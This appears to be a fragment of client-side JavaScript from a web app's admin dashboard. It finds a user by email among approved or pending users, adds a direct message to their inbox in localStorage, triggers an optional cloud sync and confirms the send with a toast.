  let user = approved.find(u => u.email && u.email.toLowerCase() === activeEditUserEmail.toLowerCase());
  let targetArray = approved;

  if (!user) {
    user = pending.find(u => u.email && u.email.toLowerCase() === activeEditUserEmail.toLowerCase());
    targetArray = pending;
  }

  if (!user) return;

  if (!Array.isArray(user.messages)) user.messages = [];
  user.messages.unshift({
    id: 'msg_' + Date.now(),
    subject: subject,
    body: body,
    date: new Date().toISOString(),
    read: false
  });

  if (targetArray === approved) {
    localStorage.setItem('geniusact_approved_users', JSON.stringify(approved));
  } else {
    localStorage.setItem('geniusact_pending_users', JSON.stringify(pending));
  }

  const curStr = localStorage.getItem('geniusact_current_user');
  if (curStr) {
    const cur = JSON.parse(curStr);
    if (cur.email && cur.email.toLowerCase() === user.email.toLowerCase()) {
      cur.messages = user.messages;
      localStorage.setItem('geniusact_current_user', JSON.stringify(cur));
    }
  }

  if (window.cloudSyncFull) {
    try { await window.cloudSyncFull(); } catch(e) { }
  }

  document.getElementById('edash-msg-subject').value = '';
  document.getElementById('edash-msg-body').value = '';

  showToast(`Direct message sent to ${user.email}'s dashboard inbox!`);
};
